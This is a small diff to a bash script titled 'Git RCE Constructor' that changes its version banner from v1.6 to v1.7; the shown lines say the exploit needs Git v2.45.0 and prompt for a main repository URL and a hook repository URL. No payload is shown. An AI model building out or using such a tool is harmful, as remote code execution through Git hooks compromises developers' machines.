@@ -1,7 +1,7 @@
 #!/bin/bash
 set +x
-echo Git RCE Constructor v1.6 \(Remote Mode\)
-echo -e "\033]0;Git RCE Constructor v1.6 (Remote Mode)\007"
+echo Git RCE Constructor v1.7 \(Remote Mode\)
+echo -e "\033]0;Git RCE Constructor v1.7 (Remote Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 read -r -p "Main repository URL: " main_repo_path
 read -r -p "Hook repository URL: " hook_repo_path
